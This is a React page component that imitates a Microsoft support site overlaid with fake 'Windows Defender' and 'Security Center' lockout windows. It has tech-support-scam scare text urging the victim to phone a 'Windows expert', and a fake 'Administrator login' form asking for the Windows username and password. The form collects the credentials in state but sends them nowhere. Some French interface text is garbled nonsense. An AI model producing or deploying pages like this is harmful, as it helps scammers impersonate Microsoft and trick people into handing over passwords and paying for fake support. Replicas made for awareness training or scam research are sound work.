'use client';

import React, { useState } from 'react';

export default function WindowsSecurityPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  return (
    <div className="fixed inset-0 z-[200] bg-[#f5f5f5] overflow-hidden select-none">
      {/* Background - Microsoft Support Website */}
      <div className="absolute inset-0 bg-white">
        {/* Microsoft Header */}
        <div className="h-14 bg-white border-b border-gray-200 flex items-center justify-between px-8">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2">
              <svg className="w-6 h-6" viewBox="0 0 23 23">
                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
              </svg>
              <span className="font-semibold text-gray-800 text-lg">Microsoft</span>
            </div>
            <span className="text-gray-300">|</span>
            <span className="text-gray-700">Support technique</span>
            <span className="text-gray-600 ml-4">Microsoft 365</span>
          </div>
          <div className="flex items-center gap-8 text-sm text-gray-600">
            <span className="hover:underline cursor-pointer">Tout Microsoft ∨</span>
            <span className="hover:underline cursor-pointer flex items-center gap-1">
              Rechercher
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </span>
            <span className="hover:underline cursor-pointer">Se connecter</span>
            <div className="w-10 h-10 rounded-full border border-gray-300 flex items-center justify-center">
              <svg className="w-6 h-6 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
            </div>
          </div>
        </div>
        
        {/* Sub Navigation */}
        <div className="h-12 bg-white border-b border-gray-200 flex items-center px-8 gap-8 text-sm text-gray-600">
          <span className="hover:underline cursor-pointer">Produits ∨</span>
          <span className="hover:underline cursor-pointer">Appareils ∨</span>
          <span className="hover:underline cursor-pointer">Nouveautés ∨</span>
        </div>

        {/* Content Area with Blue Background */}
        <div className="flex">
          {/* Left Side - Blue Area + Content */}
          <div className="flex-1">
            {/* Blue Banner - Partial */}
            <div className="h-[180px] bg-[#0078d4] relative">
              <p className="absolute bottom-6 right-8 text-white text-base">
                íntormation-de ·saletés.
              </p>
            </div>

            {/* White Content */}
            <div className="p-8 pt-12">
              <h2 className="text-2xl font-semibold text-gray-800 mb-3">Sélectionnez le produit</h2>
              <p className="text-sm text-gray-600 mb-10 leading-relaxed">
                Nous vous montrerons d&apos;abourt les·optionc·d&apos; assistance disperible:<br/>
                Microsoft.
              </p>
              
              {/* Product Grid */}
              <div className="flex gap-32 mb-16">
                <div className="flex flex-col items-center cursor-pointer">
                  <div className="w-20 h-20 mb-4 flex items-center justify-center">
                    <svg className="w-16 h-16" viewBox="0 0 23 23">
                      <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                      <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                      <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                      <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
                    </svg>
                  </div>
                  <span className="text-sm text-gray-700">Microsoft 365</span>
                </div>
                <div className="flex flex-col items-center cursor-pointer">
                  <div className="w-20 h-20 mb-4 flex items-center justify-center">
                    <svg className="w-16 h-16" viewBox="0 0 96 96" fill="none">
                      <path d="M48 8L8 88h80L48 8z" fill="#0078d4"/>
                      <path d="M48 8L8 88h40V8z" fill="#50e6ff"/>
                      <path d="M48 40L24 88h48L48 40z" fill="#fff"/>
                    </svg>
                  </div>
                  <span className="text-sm text-gray-700">Azure</span>
                </div>
              </div>

              {/* Second Row */}
              <div className="mb-16">
                <div className="flex flex-col items-start cursor-pointer w-fit">
                  <div className="w-16 h-16 mb-3 bg-[#0078d4] rounded-lg flex items-center justify-center text-white font-bold text-3xl">
                    A
                  </div>
                  <span className="text-sm text-gray-700">Microsoft aznsts</span>
                </div>
              </div>

              {/* Bottom Links */}
              <div className="flex gap-16 text-sm text-gray-600">
                <span className="hover:underline cursor-pointer">Produits serveur</span>
                <span className="hover:underline cursor-pointer">Accessoires PC</span>
                <span className="hover:underline cursor-pointer">Publicité</span>
              </div>
            </div>
          </div>

          {/* Right Sidebar */}
          <div className="w-[320px] pt-[180px] pr-8">
            <div className="bg-white p-6">
              <h3 className="text-xl font-semibold text-gray-800 mb-3">Anniversaires</h3>
              <p className="text-sm text-gray-600 mb-8">Béaning ou mornéous pour parler à des spécialistes</p>
              
              <div className="flex gap-8">
                <div className="flex flex-col items-center cursor-pointer">
                  <div className="w-16 h-16 mb-3 bg-[#7b83eb] rounded-lg flex items-center justify-center">
                    <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/>
                    </svg>
                  </div>
                  <span className="text-xs text-gray-700">Microsoft 365</span>
                </div>
                <div className="flex flex-col items-center cursor-pointer">
                  <div className="w-16 h-16 mb-3 border-2 border-[#0078d4] rounded-lg flex items-center justify-center bg-white">
                    <svg className="w-8 h-8 text-[#0078d4]" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                    </svg>
                  </div>
                  <span className="text-xs text-gray-700">Intune</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Top Blue Warning Bar */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] bg-[#0078d4] text-white text-sm p-4 rounded-b-lg shadow-2xl z-[60]">
        <p className="text-center leading-relaxed">
          Access to this PC has been blocked for security reasons. Do not access or restart this windows. Ignoring this basic warning could result in the loss of information on this computer. Contact helpdesk as soon as possible, and a Windows expert will guide you through the investigation over the phone. Running this infection may put your PC at risk.
        </p>
        <p className="text-center font-bold mt-2">Microsoft Assistance</p>
      </div>

      {/* Microsoft Support Chat Widget - With Animation */}
      <div className="absolute bottom-24 right-8 w-[220px] bg-white rounded-xl shadow-2xl border border-gray-200 z-30 animate-bounce">
        <div className="p-5 flex items-center gap-4">
          <svg className="w-10 h-10" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
            <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
            <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
          </svg>
          <div>
            <p className="font-bold text-gray-800">Microsoft</p>
            <p className="text-sm text-gray-500">Microsoft Support</p>
          </div>
        </div>
      </div>

      {/* Bottom Windows Security Bar */}
      <div className="absolute bottom-0 left-0 right-0 h-12 bg-[#0078d4] flex items-center justify-center gap-6 z-50">
        <div className="flex items-center gap-2">
          <svg className="w-5 h-5" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#fff"/>
            <rect x="12" y="1" width="10" height="10" fill="#fff"/>
            <rect x="1" y="12" width="10" height="10" fill="#fff"/>
            <rect x="12" y="12" width="10" height="10" fill="#fff"/>
          </svg>
          <span className="text-white text-sm font-medium">Windows Security</span>
        </div>
        <span className="text-white text-sm">Microsoft Support</span>
        <span className="text-white animate-pulse text-lg">|</span>
      </div>

      {/* Small warning text above bottom bar */}
      <div className="absolute bottom-12 left-0 right-0 bg-[#fff3cd] text-[10px] text-gray-700 text-center py-1 z-40">
        Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows detected Antivirus enhanced malware that can st
      </div>

      {/* ============ CENTERED MODALS CONTAINER ============ */}
      <div className="absolute inset-0 flex items-center justify-center z-40 pointer-events-none" style={{ paddingBottom: '60px' }}>
        <div className="relative pointer-events-auto" style={{ width: '750px', height: '580px' }}>
          
          {/* System Protection Window - Back */}
          <div className="absolute left-0 top-0 w-[650px] bg-[#f0f0f0] border border-gray-500 shadow-2xl rounded-t-lg overflow-hidden">
            {/* Title Bar */}
            <div className="h-10 bg-[#0078d4] flex items-center px-4 gap-3">
              <svg className="w-5 h-5" viewBox="0 0 23 23">
                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
              </svg>
              <span className="text-white text-sm font-medium">System Protection</span>
              <div className="ml-auto flex">
                <button className="w-12 h-8 flex items-center justify-center text-white hover:bg-white/20 text-lg">─</button>
                <button className="w-12 h-8 flex items-center justify-center text-white hover:bg-white/20 text-lg">□</button>
                <button className="w-12 h-8 flex items-center justify-center text-white hover:bg-red-600 text-lg">✕</button>
              </div>
            </div>
            
            {/* Menu Bar */}
            <div className="h-10 bg-white border-b border-gray-300 flex items-center px-3">
              <button className="px-4 py-1.5 text-sm hover:bg-gray-100 rounded flex items-center gap-2">
                <span>⚙️</span> Diagnose
              </button>
            </div>
            
            {/* Red Warning Banner */}
            <div className="bg-[#c42b1c] text-white py-4 px-6">
              <h3 className="text-xl font-bold text-center">Windows-Defender</h3>
              <p className="text-sm text-center mt-1">Access to this system has been blocked for security reasons</p>
            </div>
            
            {/* Content */}
            <div className="p-6 bg-white">
              <h4 className="text-2xl text-[#0078d4] font-medium mb-4">Regretfully, the assessment is not concluded</h4>
              <p className="text-sm text-gray-700 mb-2 font-medium">Problem:</p>
              <p className="text-sm text-gray-600 mb-4">Potentially malicious software has been detected on your system.</p>
              <p className="text-sm text-[#0078d4] underline cursor-pointer mb-4">Get in touch for help</p>
              <p className="text-sm text-gray-700 font-medium">System Support:</p>
            </div>
            
            {/* Bottom Bar */}
            <div className="h-14 bg-[#f0f0f0] border-t border-gray-300 flex items-center justify-between px-6">
              <div className="flex items-center gap-3">
                <svg className="w-6 h-6" viewBox="0 0 23 23">
                  <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                  <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                  <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                  <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
                </svg>
                <div className="text-xs leading-tight">
                  <div className="font-medium">Workstation</div>
                  <div>Safety</div>
                </div>
              </div>
              <button className="bg-[#c42b1c] text-white px-8 py-2 rounded text-sm font-medium hover:bg-[#a82315]">
                Audit
              </button>
            </div>
          </div>

          {/* Security Center Window - Middle */}
          <div className="absolute left-16 top-28 w-[520px] bg-white border border-gray-400 shadow-2xl">
            {/* Title Bar */}
            <div className="h-9 bg-[#f0f0f0] border-b border-gray-300 flex items-center px-3">
              <div className="flex items-center gap-2">
                <div className="w-5 h-5 bg-[#0078d4] rounded flex items-center justify-center">
                  <span className="text-white text-xs">🛡️</span>
                </div>
                <span className="text-sm font-medium">Security Center</span>
              </div>
              <div className="ml-auto flex">
                <button className="w-8 h-7 flex items-center justify-center text-gray-600 hover:bg-gray-200">─</button>
                <button className="w-8 h-7 flex items-center justify-center text-gray-600 hover:bg-gray-200">□</button>
                <button className="w-8 h-7 flex items-center justify-center text-red-600 hover:bg-red-100 font-bold text-lg">✕</button>
              </div>
            </div>
            
            {/* Content */}
            <div className="p-8">
              <h3 className="text-[#0078d4] text-2xl">Regretfully, the assessment is not concluded</h3>
            </div>
          </div>

          {/* Administrator Login Modal - Front/Center */}
          <div className="absolute left-32 top-44 w-[450px] bg-white border border-gray-300 shadow-2xl">
            {/* Title Bar */}
            <div className="h-12 bg-[#f8f8f8] border-b border-gray-200 flex items-center justify-center relative">
              <span className="text-base font-semibold text-gray-800">Administrator login</span>
              <button className="absolute right-3 w-8 h-8 flex items-center justify-center text-red-500 hover:bg-red-50 rounded font-bold text-xl">
                X
              </button>
            </div>
            
            {/* Content */}
            <div className="p-8">
              <p className="text-sm text-gray-700 text-center mb-1">Windows has been blocked due to suspicious activity.</p>
              <p className="text-sm text-gray-700 text-center mb-1">Try logging in again with your Windows account and password.</p>
              <p className="text-sm text-gray-700 text-center mb-8">If you need help , contact Windows Support.</p>
              
              <div className="space-y-5">
                <input
                  type="text"
                  placeholder="Username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded text-sm focus:outline-none focus:border-blue-500"
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded text-sm focus:outline-none focus:border-blue-500"
                />
                <button className="w-full bg-[#0078d4] text-white py-3 rounded text-sm font-medium hover:bg-[#006cbd]">
                  Login
                </button>
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}
